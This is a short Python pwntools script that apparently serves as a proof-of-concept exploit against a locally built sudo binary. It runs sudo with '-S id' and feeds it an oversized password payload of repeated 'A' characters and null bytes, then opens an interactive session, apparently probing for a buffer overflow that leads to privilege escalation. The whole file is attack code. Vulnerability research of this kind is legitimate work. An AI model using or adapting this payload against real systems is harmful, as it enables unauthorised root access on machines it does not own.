import sys,os
from pwn import *

TARGET=os.path.realpath("/tmp/build/bin/sudo")

'''
Create a pty terminal to transmit payload
mfd, sfd = os.openpty()
fd = os.open(os.ttyname(sfd), os.O_RDONLY)
p = process([TARGET,"-S", "id"],stdin=fd)
'''
p = process([TARGET,"-S","id"])
pause()
payload = ("A"*100+"\x00")*50
#os.write(mfd, payload+"n")
pause()
p.send(payload+'\n')
p.interactive()
sys.exit(0)
